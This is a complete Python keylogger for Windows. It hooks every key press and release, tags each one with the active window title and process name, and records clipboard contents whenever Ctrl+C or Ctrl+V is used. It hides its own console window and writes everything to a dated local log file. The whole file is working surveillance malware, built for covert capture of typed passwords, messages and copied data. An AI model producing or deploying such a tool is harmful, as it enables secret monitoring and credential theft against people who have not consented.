from pynput import keyboard
import datetime
import os
import ctypes
import psutil

def get_active_window_title():
    user32 = ctypes.windll.user32
    hwnd = user32.GetForegroundWindow()
    length = user32.GetWindowTextLengthW(hwnd)
    buff = ctypes.create_unicode_buffer(length + 1)
    user32.GetWindowTextW(hwnd, buff, length + 1)
    return buff.value if buff.value else "Unknown Window"

def get_active_process_name():
    user32 = ctypes.windll.user32
    pid = ctypes.c_ulong()
    hwnd = user32.GetForegroundWindow()
    user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
    try:
        return psutil.Process(pid.value).name()
    except Exception:
        return "Unknown Process"

def get_clipboard_content():
    try:
        import win32clipboard
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        return data
    except Exception:
        return "[Clipboard read error]"

def hide_console():
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except Exception:
        pass

def get_log_filename():
    date_str = datetime.datetime.now().strftime('%Y%m%d')
    return f"keylog_{date_str}.txt"

def log_event(event_type, key, window_title, process_name, extra_info=""):
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    log_entry = f'[{timestamp}] [{window_title}] [{process_name}] {event_type}: {key} {extra_info}\n'
    print(log_entry.strip())
    with open(get_log_filename(), 'a', encoding='utf-8') as logkey:
        logkey.write(log_entry)

pressed_keys = set()
key_counts = {}
last_window = None

def on_press(key):
    global last_window
    window_title = get_active_window_title()
    process_name = get_active_process_name()
    if window_title != last_window:
        log_event("WindowChanged", "", window_title, process_name)
        last_window = window_title
    try:
        key_str = key.char
    except AttributeError:
        key_str = str(key)
    pressed_keys.add(key)
    key_counts[key_str] = key_counts.get(key_str, 0) + 1
    log_event("Pressed", key_str, window_title, process_name)

    # Detect Ctrl+V for clipboard logging
    if (keyboard.Key.ctrl_l in pressed_keys or keyboard.Key.ctrl_r in pressed_keys):
        if key == keyboard.KeyCode.from_char('v'):
            clipboard_content = get_clipboard_content()
            log_event("Clipboard Paste", "Ctrl+V", window_title, process_name, f"Content: {clipboard_content}")
        if key == keyboard.KeyCode.from_char('c'):
            clipboard_content = get_clipboard_content()
            log_event("Clipboard Copy", "Ctrl+C", window_title, process_name, f"Content: {clipboard_content}")

    # Detect Alt+Tab
    if (keyboard.Key.alt_l in pressed_keys or keyboard.Key.alt_r in pressed_keys):
        if key == keyboard.Key.tab:
            log_event("Alt+Tab", "Alt+Tab", window_title, process_name)

def on_release(key):
    window_title = get_active_window_title()
    process_name = get_active_process_name()
    try:
        key_str = key.char
    except AttributeError:
        key_str = str(key)
    log_event("Released", key_str, window_title, process_name)
    if key in pressed_keys:
        pressed_keys.remove(key)
    # Stop listener with ESC
    if key == keyboard.Key.esc:
        write_summary()
        return False

def write_summary():
    summary = "\n--- Key Press Summary ---\n"
    for key, count in key_counts.items():
        summary += f"{key}: {count}\n"
    with open(get_log_filename(), 'a', encoding='utf-8') as logkey:
        logkey.write(summary)
    print(summary)

if __name__ == "__main__":
    hide_console()  # Comment this out if you want to see the console window
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
